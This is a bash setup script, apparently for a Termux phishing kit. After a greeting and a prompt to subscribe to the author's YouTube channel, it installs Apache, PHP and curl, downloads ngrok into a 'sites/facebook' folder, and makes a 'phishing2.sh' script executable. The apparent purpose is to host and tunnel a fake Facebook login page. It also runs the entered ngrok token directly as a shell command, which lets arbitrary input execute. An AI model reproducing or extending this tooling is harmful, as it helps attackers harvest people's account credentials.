#!/bin/bash
echo ""
clear
echo ""
echo ""
limit=100
sleep 1
echo " WELCOME TO YOU"
sleep 1
echo -n "what is your Name?:"
read Name;
sleep 2
echo "Hello Mr/ Mrs [$Name]"
sleep 1
clear
echo -n "Did you subscribed my youtube channel ? y/n :"
read pilih
if [ $pilih = "y" ];
then
sleep 2
echo "Thanks for subscribing my channel"
sleep 2
clear
elif [ $pilih = "n" ];
then
sleep 2
echo "Please SUBSCRIBE CHANNEL My channel"
termux-open-url "https://www.youtube.com/channel/UCw5u7r2zZOJgPSe-3qyuOag "
sleep 4
sleep 2
fi
clear
echo ""
echo ""
echo -e $'\e[1;32m[\e[0m\e[1;77m+\e[0m\e[1;32m]\e[0m\e[1;33m!!! NGROK TOKEN MUST OTHERWISE SCRIPT NOT WORKING PROPERLY !!! \e[0m'
sleep 4
clear
echo ""
echo ""
echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m >> DOWNLOAD REQUIREMENTS >> \e[0m'
termux-setup-storage
sudo apt-get install apache2 -y
apt install php -y
apt install jq -y
apt install tail -y
apt install curl -y
apt install zip -y
pkg install wget -y
clear
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip
unzip ngrok-stable-linux-arm.zip
cp -R ngrok sites/facebook/
chmod 7777 phishing2.sh
clear
echo ""
echo ""
read -p $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m Enter The Ngrok Token [Ex. ./ngrok authtoken 1Y7IU ] : \e[0m' token
$token
sleep 2
clear
